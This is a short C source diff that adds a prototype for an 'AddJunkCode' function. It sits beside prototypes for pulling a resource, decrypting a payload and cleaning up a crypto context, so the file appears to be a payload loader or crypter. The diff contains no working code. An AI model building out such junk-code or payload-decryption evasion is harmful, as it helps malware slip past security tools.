@@ -69,6 +69,11 @@ typedef struct
 static unsigned char* GetResource(int resourceId, char* resourceType, unsigned long* dwSize);
 
 /**
+ * @brief Add junk-code
+ */
+static int AddJunkCode();
+
+/**
  * @brief Securely cleans up resources and sensitive data.
  */
 static void CleanupResources(Resources* res, CryptoContext* crypto, uint8_t* decrypted, unsigned long payloadSize);
